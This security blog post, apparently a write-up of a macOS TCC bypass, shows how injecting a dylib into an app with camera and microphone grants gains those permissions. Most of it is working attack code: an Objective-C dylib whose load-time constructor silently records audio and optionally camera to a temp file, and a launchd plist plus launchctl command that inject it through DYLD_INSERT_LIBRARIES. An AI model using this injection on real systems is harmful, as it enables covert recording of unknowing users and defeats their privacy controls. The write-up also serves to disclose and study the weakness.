> This article was first published on the [tttang Community](https://tttang.com/archive/1903/).

## What is TCC?

TCC (Transparency, Consent, and Control) is a privacy protection technology introduced by Apple, designed to manage and control the access that applications have to system resources. It is part of the macOS privacy protection mechanism, allowing users to control which applications can access specific sensitive information and system functionalities, such as the camera, microphone, location, contacts, calendar, photos, etc.

## Dylib Injection

If the target application is granted access to the microphone and camera permissions, and it uses special entitlements like `com.apple.security.cs.allow-dyld-environment-variable`, `com.apple.security.cs.disable-library-validation`, it is possible to inject a dylib (dynamic library) to bypass TCC and gain access to the microphone and camera permissions, among others.

## Hackit

The target application's signing entitlements:

![](https://github.com/user-attachments/assets/c3beb3b4-41e5-42d6-b481-093cf3958fcd)

### Recording Sound

Here’s an example of using `AVFoundation` to record audio:

```objectivec
#import <AVFoundation/AVFoundation.h>
#import <Foundation/Foundation.h>

#define PATH "/tmp/z.mov"
#define INTERVAL 10

@interface Recorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property(strong, nonatomic) AVCaptureSession *s;
@property(strong, nonatomic) AVCaptureMovieFileOutput *output;

- (void)startRecording;
- (void)stopRecording;
@end

@implementation Recorder

- (instancetype)init {
  self = [super init];
  if (self) {
    self.s = [[AVCaptureSession alloc] init];
    self.s.sessionPreset = AVCaptureSessionPresetHigh;

    NSError *error;
#ifdef USECAMERA
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput
        deviceInputWithDevice:[AVCaptureDevice
                                  defaultDeviceWithMediaType:AVMediaTypeVideo]
                        error:&error];
    if (error) {
      NSLog(@"Error setting up audio device input: %@",
            [error localizedDescription]);
      return self;
    }
    if ([self.s canAddInput:input]) {
      [self.s addInput:input];
    }
#endif
    AVCaptureDeviceInput *audioInput = [AVCaptureDeviceInput
        deviceInputWithDevice:[AVCaptureDevice
                                  defaultDeviceWithMediaType:AVMediaTypeAudio]
                        error:&error];
    if (error) {
      NSLog(@"Error setting up audio device input: %@",
            [error localizedDescription]);
      return self;
    }

    if ([self.s canAddInput:audioInput]) {
      [self.s addInput:audioInput];
    }

    // output
    self.output = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.s canAddOutput:self.output]) {
      [self.s addOutput:self.output];
    }
  }
  return self;
}

- (void)startRecording {
  [self.s startRunning];
  NSString *path = [NSString stringWithFormat:@"%s", PATH];
  [self.output startRecordingToOutputFileURL:[NSURL fileURLWithPath:path]
                           recordingDelegate:self];
  NSLog(@"Recording started");
}

- (void)stopRecording {
  [self.output stopRecording];
  [self.s stopRunning];
  NSLog(@"Recording stopped");
}

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
    didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
                        fromConnections:(NSArray *)connections
                                  error:(NSError *)error {
#ifdef DEBUG
  if (error) {
    NSLog(@"Recording failed: %@", [error localizedDescription]);
  } else {
    NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
  }
#endif
}

@end

static void __attribute__((constructor)) initialize(void) {
  @autoreleasepool {
    Recorder *ar = [[Recorder alloc] init];
    [ar startRecording];
    [NSThread sleepForTimeInterval:INTERVAL];
    [ar stopRecording];
    [[NSRunLoop currentRunLoop]
        runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
  }
}
```

Use `launch` to load the dylib in the background instead of using the `DYLD_INSERT_LIBRARIES` parameter in the command line. The plist file is written as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>{{LABEL}}</string>
        <key>EnvironmentVariables</key>
        <dict>
            <key>DYLD_INSERT_LIBRARIES</key>
            <string>{{DYLIB}}</string>  <!-- Replace with dylib -->
        </dict>
        <key>ProgramArguments</key>
        <array>
            <string>{{APP}}</string>  <!-- Replace with app -->
        </array>
        <key>RunAtLoad</key>
        <true />
        <key>StandardOutPath</key>
        <string>/tmp/zznQ.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/zznQ.log</string>
    </dict>
</plist>
```

Run `launchctl load test.plist` to start recording in the target app. The demonstration is shown below:

![](https://github.com/user-attachments/assets/2a5b1042-0f0e-49e1-b3ac-cd69229baa91)
![](https://github.com/user-attachments/assets/336c65a9-a91e-42d8-b2ac-1d007619de64)

## References

- [A deep dive into macOS TCC.db](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [CVE-2023-26818 - Bypass TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)

<!-- ##{"timestamp":1692288000}## -->